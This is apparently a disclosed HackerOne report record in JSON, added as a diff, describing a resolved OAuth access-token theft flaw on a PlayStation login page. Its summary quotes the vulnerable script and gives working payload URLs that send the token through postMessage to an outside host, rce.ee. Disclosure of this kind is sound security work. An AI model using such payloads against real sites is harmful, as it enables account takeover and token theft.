@@ -1,0 +1,178 @@
+{
+  "id": 821896,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjE4OTY=",
+  "url": "https://hackerone.com/reports/821896",
+  "title": "Access token stealing.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-16T21:23:42.605Z",
+  "submitted_at": "2020-03-16T21:23:42.605Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bugdiscloseguys",
+    "url": "/bugdiscloseguys",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 44879,
+    "url": "https://hackerone.com/playstation",
+    "handle": "playstation",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "PlayStation",
+      "twitter_handle": "PlayStation",
+      "website": "https://www.playstation.com",
+      "about": "Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-11-21T00:36:00.518Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-30T19:24:23.833Z",
+  "team_member_agreed_on_going_public_at": "2020-11-21T00:36:00.378Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "bounty_amount": "1200.0",
+  "formatted_bounty": "$1,200",
+  "weakness": {
+    "id": 152,
+    "name": "Missing Authorization"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 167,
+  "voters": [
+    "th3hidd3nmist",
+    "n1m0",
+    "xploiterr",
+    "coldfish",
+    "ali_shehab",
+    "mashoud1122",
+    "fqdn",
+    "mainteemoforfun",
+    "rook1337",
+    "bibekshah",
+    "and 157 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 40731,
+    "asset_type": "URL",
+    "asset_identifier": "my.playstation.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 25534,
+      "category": "team",
+      "content": "# Summary:\n`https://my.playstation.com/auth/response.html` suffers from a misconfiguration which leads to access token stealing.\n\n# Description:\nThe page `https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&baseUrl=/&targetOrigin=https://my.playstation.com` hosts a javascript which is responsible for transferring OAuth access token from the issuing server to the client.\n\nOn analyzing this javascript we found an issue which leads to an access token stealing.\n\n```\n    function parseResponse(a) {\n    var b = a.hash.substr(1),\n        c = a.search.substr(1),\n        d = b + \"&\" + c,\n        e = convertToObject(d);\n    return e.refererURL = a.toString(), e\n}\n\n....\n....\n....\nfunction sendResponseToApp(a) {\n    var b = extractFrameTypeFromRequestID(a.requestID),\n        c = a.targetOrigin || getOrigin(),\n        d = a.baseUrl || \"\",\n        e = a.returnRoute || \"\",\n        f = a.excludeQueryParams,\n        g = !f && window.location.search || \"\";\n    switch (b) {\n        case \"iframe\":\n            window.parent.postMessage(a, c);\n            break;\n        case \"window\":\n            window.opener.postMessage(a, c);\n            break;\n        case \"external\":\n        default:\n            var h = constructUrl(c, d, e) + g;\n            /^(https:\\/\\/)([a-z0-9\\-]+\\.)+(playstation\\.com)(:([0-9]){4})?\\//.test(h) ?\n             window.location.href = h : window.location.href = \"https://playstation.com/error\"\n    }\n}\n\n\nvar response = parseResponse(window.location);\nsendResponseToApp(response);\n```\n\n```\nvar b = extractFrameTypeFromRequestID(a.requestID),\n...\nswitch (b)\n  case \"window\":\n            window.opener.postMessage(a, c);\n            break;\n```\n\nTo get into the window case we need to start the requestID parameter value from `window` keyword.\na => window.location\nc => a.targetOrigin which is the query parameter `targetOrigin` extracted using the function parseResponse.\na,c are passed to window.opener.postMessage() which takes the first argument as the message itself and second as the origin where to send the message.\n\nOur payload URL will become something like this: https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&baseUrl=/&targetOrigin=https://rce.ee/\n\nWe pass this payload URL to the OAuth issuing server: https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3a//my.playstation.com/auth/response.html%3frequestID%3dwindow_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1%26baseUrl%3d/%26targetOrigin%3dhttps%3a//rce.ee/&prompt=none\n\nHere's the final PoC : https://rce.ee/psoauthbypass1007.html\n\n# Steps to reproduce:\nOpen https://playstation.com/\nLogin with your account\nOpen and click! https://rce.ee/psoauthbypass1007.html\n\n# Impact\nAccess token stealing/account takeover.",
+      "user": {
+        "id": 319901,
+        "username": "serv",
+        "name": "s",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2018-07-30T18:21:23.048Z",
+        "url": "https://hackerone.com/serv",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "id": 25535,
+      "category": "researcher",
+      "content": "This was found In collaboration with @iamnoooob.",
+      "user": {
+        "id": 50036,
+        "username": "bugdiscloseguys",
+        "name": "Bugdiscloseguys",
+        "bio": "Your neighborhood hacker!",
+        "cleared": false,
+        "verified": true,
+        "website": "https://httpvoid.com",
+        "location": "",
+        "created_at": "2016-01-08T19:44:35.089Z",
+        "url": "https://hackerone.com/bugdiscloseguys",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
